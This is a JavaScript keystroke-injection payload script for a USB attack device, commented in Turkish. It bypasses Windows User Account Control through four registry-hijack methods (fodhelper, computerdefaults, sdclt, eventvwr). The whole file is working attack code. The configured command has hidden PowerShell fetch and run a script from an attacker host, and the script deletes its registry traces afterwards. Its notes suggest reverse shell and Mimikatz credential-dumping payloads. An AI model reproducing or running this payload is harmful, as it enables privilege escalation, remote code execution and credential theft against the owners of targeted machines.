// ═══════════════════════════════════════════════════════════════════════════
// Payload: win_uac_bypass.js
// Target:  Windows 10/11
// Time:    ~6 seconds
// Author:  MoMo-Mimic Team
// ═══════════════════════════════════════════════════════════════════════════
// 
// Açıklama: UAC'ı bypass ederek yüksek yetkili komut çalıştırır
// Birden fazla bypass tekniği içerir
// 
// ═══════════════════════════════════════════════════════════════════════════

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ CONFIGURATION                                                            │
// └─────────────────────────────────────────────────────────────────────────┘
// Bypass sonrası çalıştırılacak komut
var PAYLOAD_CMD = "powershell -ep bypass -w hidden -c \\\"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')\\\"";

// Bypass yöntemi: "fodhelper" | "computerdefaults" | "sdclt" | "eventvwr"
var BYPASS_METHOD = "fodhelper";

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ SETTINGS                                                                 │
// └─────────────────────────────────────────────────────────────────────────┘
layout("us");
typingSpeed(0, 0);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 1: INITIALIZATION                                                  │
// └─────────────────────────────────────────────────────────────────────────┘
delay(2000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 2: OPEN POWERSHELL                                                 │
// └─────────────────────────────────────────────────────────────────────────┘
press("GUI-r");
delay(500);
type("powershell -ep bypass -w hidden");
press("ENTER");
delay(1500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 3: UAC BYPASS - FODHELPER METHOD                                   │
// └─────────────────────────────────────────────────────────────────────────┘
// FodHelper.exe bypass (Windows 10/11)
// Bu program auto-elevate özelliğine sahip ve registry'den komut okur

if (BYPASS_METHOD == "fodhelper") {
    // Registry key oluştur
    type("New-Item 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Force | Out-Null; ");
    type("New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Name 'DelegateExecute' -Value '' -Force | Out-Null; ");
    type("Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Name '(default)' -Value '" + PAYLOAD_CMD + "' -Force");
    press("ENTER");
    delay(1000);
    
    // FodHelper'ı çalıştır (elevated)
    type("Start-Process fodhelper.exe -WindowStyle Hidden");
    press("ENTER");
    delay(2000);
    
    // Temizlik - Registry key sil
    type("Remove-Item 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force -ErrorAction SilentlyContinue");
    press("ENTER");
}

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 3 ALT: COMPUTERDEFAULTS METHOD                                     │
// └─────────────────────────────────────────────────────────────────────────┘
if (BYPASS_METHOD == "computerdefaults") {
    type("New-Item 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Force | Out-Null; ");
    type("New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Name 'DelegateExecute' -Value '' -Force | Out-Null; ");
    type("Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Name '(default)' -Value '" + PAYLOAD_CMD + "' -Force");
    press("ENTER");
    delay(1000);
    
    type("Start-Process computerdefaults.exe -WindowStyle Hidden");
    press("ENTER");
    delay(2000);
    
    type("Remove-Item 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force -ErrorAction SilentlyContinue");
    press("ENTER");
}

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 3 ALT: SDCLT METHOD                                                │
// └─────────────────────────────────────────────────────────────────────────┘
if (BYPASS_METHOD == "sdclt") {
    type("New-Item 'HKCU:\\Software\\Classes\\Folder\\shell\\open\\command' -Force | Out-Null; ");
    type("New-ItemProperty -Path 'HKCU:\\Software\\Classes\\Folder\\shell\\open\\command' -Name 'DelegateExecute' -Value '' -Force | Out-Null; ");
    type("Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\Folder\\shell\\open\\command' -Name '(default)' -Value '" + PAYLOAD_CMD + "' -Force");
    press("ENTER");
    delay(1000);
    
    type("Start-Process 'C:\\Windows\\System32\\sdclt.exe' -WindowStyle Hidden");
    press("ENTER");
    delay(2000);
    
    type("Remove-Item 'HKCU:\\Software\\Classes\\Folder' -Recurse -Force -ErrorAction SilentlyContinue");
    press("ENTER");
}

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 3 ALT: EVENTVWR METHOD                                             │
// └─────────────────────────────────────────────────────────────────────────┘
if (BYPASS_METHOD == "eventvwr") {
    type("New-Item 'HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command' -Force | Out-Null; ");
    type("Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command' -Name '(default)' -Value '" + PAYLOAD_CMD + "' -Force");
    press("ENTER");
    delay(1000);
    
    type("Start-Process eventvwr.exe -WindowStyle Hidden");
    press("ENTER");
    delay(2000);
    
    type("Remove-Item 'HKCU:\\Software\\Classes\\mscfile' -Recurse -Force -ErrorAction SilentlyContinue");
    press("ENTER");
}

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 4: CLEANUP                                                         │
// └─────────────────────────────────────────────────────────────────────────┘
delay(500);
type("exit");
press("ENTER");

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ NOTES                                                                    │
// └─────────────────────────────────────────────────────────────────────────┘
// Bypass Yöntemleri:
// - fodhelper: Windows 10/11 - En güvenilir
// - computerdefaults: Windows 10/11
// - sdclt: Windows 10 - Bazı güncellemelerde yamalı
// - eventvwr: Windows 7/8/10 - Eski ama hala çalışır
//
// Payload örnekleri:
// - Reverse shell: powershell -ep bypass -c "IEX(...)"
// - Mimikatz: powershell -c "IEX(New-Object Net.WebClient).DownloadString(...)"
// - Komutu değiştirmek için PAYLOAD_CMD değişkenini düzenle

